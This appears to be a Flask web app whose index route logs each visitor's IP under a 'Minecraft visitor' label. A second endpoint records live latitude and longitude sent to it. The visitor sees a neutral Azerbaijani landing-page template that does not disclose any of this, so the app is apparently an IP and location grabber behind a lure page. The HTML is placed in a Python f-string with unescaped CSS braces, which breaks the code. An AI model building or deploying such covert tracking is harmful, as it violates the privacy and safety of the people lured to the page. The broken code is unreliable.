from flask import Flask, request
import datetime
import os

app = Flask(__name__)

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    print(f"[{datetime.datetime.now()}] 🎮 MINECRAFT ZİYARƏTÇİSİ - IP: {ip}")

    return f"""
    <!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Müasir Veb Səhifə Şablonu</title>
    <style>
        /* Əsas Səhifə Tənzimləmələri */
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #1a1a1a; /* Tünd arxa plan */
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        /* Konteyner nizamı (Flexbox istifadə edərək iki hissəyə bölmək) */
        .container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 85%;
            max-width: 1200px;
            gap: 50px;
        }

        /* Sol Tərəf: Mətn Hissəsi */
        .text-section {
            flex: 1;
        }

        .text-section h1 {
            font-size: 4rem;
            margin-bottom: 20px;
            line-height: 1.1;
        }

        .text-section p {
            font-size: 1.5rem;
            color: #cccccc;
            margin-bottom: 10px;
        }

        /* Sağ Tərəf: Fəaliyyət Kartı */
        .card-section {
            background-color: #242424;
            padding: 50px 40px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            min-width: 300px;
        }

        .card-section h2 {
            margin-bottom: 30px;
            font-size: 2.2rem;
        }

        /* Düymə Dizaynı */
        .btn {
            background-color: #1DB954; /* Yaşıl rəng */
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 1.3rem;
            border-radius: 50px; /* Yumru kənarlar */
            cursor: pointer;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto;
            transition: background-color 0.3s ease, transform 0.2s ease;
        }

        .btn:hover {
            background-color: #1ed760;
            transform: scale(1.05);
        }

        .card-section p {
            margin-top: 20px;
            font-size: 1rem;
            color: #aaaaaa;
        }

        /* Mobil Ekranlar üçün Uyğunluq (Responsive Design) */
        @media (max-width: 768px) {
            .container {
                flex-direction: column;
                text-align: center;
            }
            .text-section h1 {
                font-size: 3rem;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="text-section">
            <p>Diqqət çəkən kiçik başlıq.</p>
            <h1>Əsas mesajınızı və sloqanınızı bura yazın.</h1>
            <p>Əlavə üstünlükləriniz haqqında qısa məlumat.</p>
        </div>

        <div class="card-section">
            <h2>İstifadəyə Başla</h2>
            <button class="btn">🚀 Başla</button>
            <p>Qeydiyyat üçün əlavə məlumat tələb olunmur.</p>
        </div>
    </div>

</body>
</html>
    """

@app.route('/log-location', methods=['POST'])
def log_location():
    try:
        data = request.get_json()
        lat = data.get('lat')
        lon = data.get('lon')
        print(f"📍 CANLI KONUM ALINDI → Lat: {lat} | Lon: {lon} | Saat: {datetime.datetime.now()}")
        return "OK"
    except:
        return "ERROR"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
